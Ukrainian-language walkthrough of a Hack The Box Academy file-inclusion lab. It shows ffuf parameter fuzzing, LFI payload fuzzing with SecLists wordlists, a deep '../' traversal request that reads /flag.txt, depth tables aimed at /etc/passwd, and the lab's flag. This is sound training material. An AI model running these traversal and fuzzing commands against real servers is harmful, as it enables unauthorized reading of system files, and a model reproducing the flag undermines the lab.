## LFI — Automated Discovery: ffuf Parameter + Payload Fuzzing

**Модуль:** [File Inclusion](https://academy.hackthebox.com/app/module/23)
**Секція:** [Automated Scanning](https://academy.hackthebox.com/app/module/23/section/1494)
**Завдання:** Знайти прихований параметр → зфаззити LFI payload → прочитати `/flag.txt`
**Прапор:** `HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}`

***

## Концепція

Два етапи автоматизованого LFI:
1. **Parameter fuzzing** — знаходимо прихований GET-параметр (`?view=`)
2. **LFI payload fuzzing** — перебираємо готові LFI-payloads з wordlist поки не знаходимо робочий

***

## Крок 1 — Визначення baseline розміру відповіді

```bash
curl -s "http://TARGET_IP:PORT/index.php" | wc -c
# 2309 — розмір "нормальної" відповіді без параметрів
```

Будь-яка відповідь з розміром ≠ 2309 означає що параметр впливає на сторінку.

***

## Крок 2 — Фаззинг параметрів

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://TARGET_IP:PORT/index.php?FUZZ=value' \
  -fs 2309 \
  -t 40
```

| Прапор | Призначення |
|---|---|
| `-fs 2309` | Фільтрувати відповіді розміром 2309 (baseline) |
| `burp-parameter-names.txt` | ~6400 типових назв параметрів |
| `-t 40` | 40 паралельних потоків |

**Результат:** знайдено параметр `view` (розмір 1935 ≠ 2309).

***

## Крок 3 — Новий baseline з відомим параметром

```bash
curl -s "http://TARGET_IP:PORT/index.php?view=value" | wc -c
# 1935 — новий baseline для LFI fuzzing
```

***

## Крок 4 — LFI payload fuzzing

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://TARGET_IP:PORT/index.php?view=FUZZ' \
  -fs 1935 \
  -t 40
```

**Результат:** знайдено 6 робочих payload-ів з різною глибиною `../` — всі ведуть до `/etc/passwd` (розмір 3309).

***

## Крок 5 — Читаємо цільовий файл

```bash
curl -s "http://TARGET_IP:PORT/index.php?view=../../../../../../../../../../../../../../../../../../../../../../flag.txt" \
  | grep -o 'HTB{[^}]*}'
# HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}
```

***

## Чому різна глибина `../` у wordlist-і

Застосунок може мати webroot на різній глибині:

| Шлях webroot | Потрібна глибина |
|---|---|
| `/var/www/html/` | `../../../../` (4 рівні) |
| `/var/www/html/app/public/` | `../../../../../../` (6 рівнів) |
| Невідомо | `../../../../../../../../../../../../../../etc/passwd` (надлишок — безпечно) |

Надлишкові `../` ігноруються ОС — `/` не дає піднятись вище кореня.

***

## LFI Fuzzing Wordlists

| Wordlist | Призначення |
|---|---|
| `LFI-Jhaddix.txt` | Широкий набір LFI payloads (різна глибина + bypass техніки) |
| `LFI-gracefulsecurity-linux.txt` | Типові Linux чутливі файли |
| `LFI-gracefulsecurity-windows.txt` | Типові Windows чутливі файли |
| `burp-parameter-names.txt` | Fuzzing параметрів GET/POST |

***

## Прапор

```
HTB{4u70m47!0n_f!nd5_#!dd3n_93m5}
```
